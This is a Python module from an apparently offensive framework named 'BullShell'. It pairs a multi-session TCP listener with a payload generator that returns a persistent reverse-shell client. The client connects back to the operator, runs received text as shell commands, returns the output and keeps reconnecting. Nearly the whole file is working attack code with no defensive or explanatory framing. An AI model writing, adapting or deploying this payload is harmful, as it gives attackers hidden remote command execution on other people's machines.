
#basic module description
def description() -> str:
    return "TCP reverse shell"

#basic module rank
def rank() -> str:
    return "Good"

#basic module date
def date() -> str:
    return "18.04.2026"

#set arguments
def depargs() -> dict:
    return {
        "host": "IPv4 addr",
        "port": "Port"
    }

#imports
from StrFuncs import err, evnt, timenow, beautip, current
import socket, os, threading
from colorama import Fore, Style
from SessionManager import manager

#interact with session
def interact(sid: int) -> None:
    session = manager.getsession(sid)
    if not session:
        print(f"{err()} Manager has no session")
    conn, addr = session["conn"], session["addr"]
    print(f"{evnt()} Connection established from {beautip(addr[0])}:{addr[1]}")
    while True:
        try:
            command = input(f"{Fore.RED}BullShell>{Style.RESET_ALL}").strip()
            if not command:
                continue
            if command == exit:
                break
            conn.send(command.encode())
            rawstr = conn.recv(1024 * 1024).decode(errors="ignore")
            if not rawstr:
                print(f"{evnt()} Client disconnected!")
                manager.remove(sid)     
                break
            print(rawstr)      
        except Exception as g:
            print(g)
            manager.remove(sid)  
            break

#main function
def main(ip: str, port: int) -> None:
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(10)
        print(f"{evnt()} Listening for incoming connection...")
        def loop():
            while True:
                try:
                    conn, addr = s.accept()
                    sid = manager.add(conn, addr)
                    print(f"\r\n{evnt()} {timenow()} New session [{sid}]")
                    print(f"{current()}", end="", flush=True)
                except Exception as h:
                    print(h)
        threading.Thread(target=loop, daemon=True).start()
    except Exception as error:
        print(f"{err()} {error}")
        import traceback
        print(f"\n{err()} Error:")
        traceback.print_exc()


#launch func
def launch(args: dict) -> None:
    ip = args.get("host", "127.0.0.1")
    port = int(args.get("port", 8888))
    main(ip, port)
    

#source code (only for payloads)
def code(rhost: str, rport: int):
    return """
import time
import socket
import subprocess
import os
lhost = "{rhost}"
lport = {rport}
def connect():
    while True:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        try:
            
            s.connect((lhost, lport))
            while True:
                data = s.recv(1024)
                command = data.decode("utf-8", errors="ignore")
                if command.strip() == "kill":
                    return
                elif command.startswith("cd "):
                    try:
                        path = data.decode("utf-8")[3:]
                        os.chdir(path)
                        s.send(f" Changed directory to {os.getcwd()}".encode())
                    except Exception as l:
                        s.send(str(l).encode())
                elif len(data) > 0:
                    proc = subprocess.Popen(data.decode("utf-8"), shell=True, 
                                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                            stdin=subprocess.PIPE)
                    stdout = proc.stdout.read() + proc.stderr.read()
                    s.send(stdout)
                    if not stdout:
                        s.send(b"Ok")
        except Exception:
            pass
        finally:
            s.close()
        time.sleep(5)

if __name__ == "__main__":
    connect()
"""
